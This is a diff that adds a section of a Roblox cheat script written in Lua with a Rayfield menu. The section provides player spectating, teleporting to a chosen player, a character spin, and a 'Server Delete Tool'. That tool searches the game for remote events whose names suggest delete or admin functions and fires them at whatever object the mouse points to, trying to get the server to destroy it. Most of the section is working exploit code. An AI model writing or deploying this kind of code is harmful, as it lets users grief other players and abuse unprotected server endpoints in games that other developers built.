+local UtilTab = Window:CreateTab("Spectate & Extra", 4483362458)
+
+local targetPlayer = nil
+local function getPNames() local t = {}; for _, p in pairs(Players:GetPlayers()) do if p ~= player then table.insert(t, p.Name) end end return t end
+
+local spectateDrop = UtilTab:CreateDropdown({ Name = "Select Target Player", Options = getPNames(), CurrentOption = {"Select"}, MultipleOptions = false, Callback = safeCall(function(O) local name = type(O)=="table" and O[1] or O; targetPlayer = name and Players:FindFirstChild(name) or nil end) })
+
+UtilTab:CreateToggle({ Name = "36. Spectate Player", CurrentValue = false, Callback = safeCall(function(V) if V and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then camera.CameraSubject = targetPlayer.Character.Humanoid else if character and character:FindFirstChild("Humanoid") then camera.CameraSubject = character.Humanoid end end end) })
+
+UtilTab:CreateButton({ Name = "37. Teleport to Target Player", Callback = safeCall(function() if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and character and character:FindFirstChild("HumanoidRootPart") then pcall(function() character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3) end) end end) })
+
+UtilTab:CreateButton({ Name = "38. Refresh Player Dropdown", Callback = safeCall(function() pcall(function() spectateDrop:Refresh(getPNames()) end) end) })
+
+local function tryServerDelete(target)
+    if not target then return false, "no target" end
+    local keywords = {"delete","remove","destroy","admin","server","destroyitem","del","removeobject"}
+    local remotes = {}
+    for _, v in ipairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+            local name = v.Name:lower()
+            for _, k in ipairs(keywords) do
+                if string.find(name, k) then
+                    table.insert(remotes, v)
+                    break
+                end
+            end
+        end
+    end
+    for _, r in ipairs(remotes) do
+        local ok2, res = pcall(function()
+            if r:IsA("RemoteEvent") then
+                r:FireServer(target)
+                r:FireServer(target.Name)
+                r:FireServer(target:GetFullName())
+                return true
+            elseif r:IsA("RemoteFunction") then
+                r:InvokeServer(target)
+                return true
+            end
+        end)
+        if ok2 and res then return true, "fired "..r:GetFullName() end
+    end
+    return false, "no suitable remote found"
+end
+
+UtilTab:CreateButton({ Name = "39. Server Delete Tool", Callback = safeCall(function()
+    local t = Instance.new("Tool")
+    t.Name = "Server Delete Tool"
+    t.RequiresHandle = false
+    t.Parent = player:FindFirstChild("Backpack") or player
+    t.Activated:Connect(function()
+        local target = mouse and mouse.Target
+        if not target or target:IsDescendantOf(character) then
+            pcall(function() Rayfield:Notify({ Title = "Delete Tool", Content = "유효한 타겟이 없습니다.", Duration = 3 }) end)
+            return
+        end
+        local ok2, msg = pcall(tryServerDelete, target)
+        if ok2 and msg then
+            if ok2 == true then
+                pcall(function() Rayfield:Notify({ Title = "Delete Tool", Content = "서버 삭제 요청 전송: "..tostring(msg), Duration = 3 }) end)
+                return
+            end
+        end
+        local success, err = pcall(function() target:Destroy() end)
+        if success then
+            pcall(function() Rayfield:Notify({ Title = "Delete Tool", Content = "로컬 삭제 완료(서버 삭제 실패).", Duration = 3 }) end)
+        else
+            pcall(function() Rayfield:Notify({ Title = "Delete Tool", Content = "삭제 실패: "..tostring(err), Duration = 5 }) end)
+        end
+    end)
+end) })
+
+local spinActive = false
+local spinConn = nil
+local spinSpeed = 20
+UtilTab:CreateSlider({ Name = "Spin Speed (deg)", Range = {1, 720}, Increment = 1, CurrentValue = spinSpeed, Callback = safeCall(function(V) spinSpeed = V end) })
+UtilTab:CreateToggle({ Name = "40. Spin Character", CurrentValue = false, Callback = safeCall(function(V)
+   spinActive = V
+   if V then
+      if not spinConn then
+         spinConn = RunService.RenderStepped:Connect(function()
+            if spinActive and character and character:FindFirstChild("HumanoidRootPart") then
+               character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
+            end
+         end)
+      end
+   else
+      if spinConn then spinConn:Disconnect(); spinConn = nil end
+   end
+end) })
+
+Rayfield:Notify({ Title = "40 Features Ready!", Content = "All features loaded successfully.", Duration = 5, Image = 4483362458 })
